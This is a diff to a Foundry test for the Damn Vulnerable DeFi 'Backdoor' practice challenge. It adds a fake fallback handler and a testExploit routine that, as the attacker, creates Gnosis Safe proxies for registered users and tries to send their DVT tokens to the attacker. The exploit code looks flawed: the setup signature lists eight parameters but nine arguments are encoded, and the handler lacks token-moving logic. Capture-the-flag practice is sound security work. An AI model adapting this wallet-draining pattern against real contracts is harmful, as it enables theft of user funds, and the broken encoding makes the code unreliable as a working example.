@@ -3,11 +3,34 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+
+contract FakeGnosisSafeFallbackHandler {
+    address payable public owner;
+    address public gnosisSafeProxy;
+    DamnValuableToken public dvt;
+
+    constructor(DamnValuableToken _dvt) public {
+        owner = payable(msg.sender);
+        dvt = _dvt;
+    }
+    
+    function setup() external {
+        gnosisSafeProxy = address(msg.sender);
+        console2.log("FakeGnosisSafeFallbackHandler - Registered new safeProxy: %s", gnosisSafeProxy);
+    }
+
+    modifier _ownerOnly () {
+        assert(msg.sender == owner);
+        _;
+    }
+}
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -35,6 +58,11 @@ contract Backdoor is Test {
         bob = users[1];
         charlie = users[2];
         david = users[3];
+
+        vm.label(alice, "Alice");
+        vm.label(bob, "Bob");
+        vm.label(charlie, "Charlie");
+        vm.label(david, "David");
 
         attacker = payable(
             address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
@@ -72,6 +100,27 @@ contract Backdoor is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        // We create safes with users as owners but register a scammy callback function to allow us to call anything ...
+        address[] memory owners = new address[](1);
+
+        for (uint256 i = 0; i < NUM_USERS; ++i){
+            owners[0] = users[i];
+            console2.log("Starting the loop with address %s", owners[0]);
+        
+            FakeGnosisSafeFallbackHandler fallbackHandler = new FakeGnosisSafeFallbackHandler(dvt);
+
+            bytes memory initializerCallData = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)"
+                , owners, 1, fallbackHandler, abi.encodeWithSignature("setup()"), address(dvt), i, 1, attacker
+            );
+            
+            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializerCallData, 0, walletRegistry);
+            address(proxy).call{value:0}(abi.encodeWithSignature("transfer(address,uint256)", attacker, dvt.balanceOf(address(proxy))));
+        }
+        
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
